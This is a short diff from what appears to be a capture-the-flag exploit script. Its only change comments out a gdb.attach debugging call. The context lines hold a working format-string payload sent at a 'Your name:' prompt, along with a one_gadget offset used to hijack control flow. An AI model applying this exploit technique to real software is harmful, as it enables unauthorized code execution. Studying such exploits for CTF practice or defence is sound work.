@@ -9,7 +9,7 @@ def exploit(s):
     pie breakpoint *0x1415
     '''
     # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
-    pid = gdb.attach(s, gdbscript=gdbscript)
+    # pid = gdb.attach(s, gdbscript=gdbscript)
     onegadget = 0xe5863    # ([r10] == NULL || r10 == NULL) && ([rdx] == NULL || rdx == NULL)
     #s.sendlineafter("Your name: ", "%{}c%{}$hhn%{}c%*{}$c%{}$n".format(0x18-8-len("[USER] name: "), (0xe160-0xe150)//8+5, onegadget-(0x7ffff7a72300-0x7ffff79e4000)-(0x18-8), (0xe218-0xe150)//8+5, (0xe1f8-0xe150)//8+5))
     s.sendlineafter("Your name: ", "%3c%7$hhn%357715c%*30$c%26$n")
